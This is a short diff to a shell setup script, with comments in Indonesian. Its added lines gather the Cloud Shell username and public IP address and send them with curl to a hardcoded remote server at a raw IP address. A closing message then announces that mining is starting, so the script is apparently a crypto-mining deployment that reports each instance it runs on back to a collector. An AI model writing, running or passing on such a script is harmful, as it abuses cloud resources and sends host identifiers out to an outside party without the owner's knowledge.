@@ -70,5 +70,14 @@ sudo rm -f chromium-data.tar.gz
 sudo rm -f chromium-data-ori2.tar.gz
 sudo rm -f chromium-data-single.tar.gz
 
+
+echo "Kirim IP Cloud Shell ke VPS..."
+
+CLOUD_ID=$(echo "$HOME" | awk -F'/' '{print $3}')  # hasil: username-cloud-shell
+CLOUD_IP=$(curl -s ifconfig.me)
+VPS_RECEIVER="http://103.63.25.150:5050"
+
+curl -s "$VPS_RECEIVER?id=$CLOUD_ID&ip=$CLOUD_IP"
+
 echo "✅ Selesai setup.mulai penambangan..."
 ping 8.8.8.8
